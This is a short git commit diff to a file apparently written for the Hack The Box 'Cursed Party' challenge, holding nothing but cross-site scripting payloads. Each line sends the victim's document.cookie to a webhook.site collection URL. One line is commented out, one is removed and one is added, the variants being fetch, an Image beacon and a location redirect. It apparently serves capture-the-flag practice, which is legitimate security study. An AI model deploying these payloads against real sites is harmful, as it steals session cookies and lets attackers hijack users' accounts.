c28e4bc29c7bcf04e01aaba15e7670d195b782d4
vanh2k2 <92329883+vanh2k2@users.noreply.github.com>
2023-10-09 11:10:21 +0700

    Update HTB_cursedparty.js

--- HTB_cursedparty.js
+++ HTB_cursedparty.js
@@ -1,3 +1,3 @@
 // fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
 
-var i=new Image;i.src="https://webhook.site/36717354-fe0d-4881-98fd-73c025f282b2/?cookie="+document.cookie;
+location="https://webhook.site/36717354-fe0d-4881-98fd-73c025f282b2/?cookie="+document.cookie;
